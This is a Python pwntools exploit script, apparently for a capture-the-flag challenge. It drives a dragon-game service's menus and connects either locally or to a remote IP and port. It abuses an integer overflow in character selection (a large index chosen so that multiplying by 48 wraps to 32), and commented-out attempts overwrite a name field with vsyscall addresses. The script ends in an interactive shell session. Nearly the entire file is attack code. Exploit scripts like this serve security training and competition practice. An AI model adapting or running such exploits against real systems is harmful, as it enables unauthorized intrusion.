from sys import argv
from pwn import *

context.arch = 'amd64'

host = '127.0.0.1'
port = 8888
if len(argv) == 2 and argv[1] == 'remote':
    host = '35.201.132.60'
    port = 13337
r = remote(host, port)

# menus

def select_character(choice):
    r.recvuntil(':')
    r.sendline('2')
    r.recvuntil(':')
    r.sendline(str(choice))

def start_game():
    r.recvuntil(':')
    r.sendline('3')

def back():
    r.recvuntil(':')
    r.sendline('87')

# start

def fight_dragon():
    r.recvuntil(':')
    r.sendline('1')

def craft_weapon():
    r.recvuntil(':')
    r.sendline('3')

def sleep():
    r.recvuntil(':')
    r.sendline('4')

def change_name(new_name):
    r.recvuntil(':')
    r.sendline('5')
    r.recvuntil(':')
    r.sendline(new_name)

llmax = 9223372036854775807
ofto2 = 384307168202282326 # ofto2 * 48 = 32 due to overflow

# select_character(0)
select_character(ofto2)
start_game()
sleep()
craft_weapon()
# input('debug')
# print(len(p64(0xffffffffff600010)))
# change_name(p64(0xffffffffff600010))
# change_name(p64(0xffffffffff600010) + p64(0xffffffffffffffff)[:-1])
# change_name('a'*8)
# input('debug')
# back()
# select_character(0)
# input('debug')
# start_game()

r.interactive()
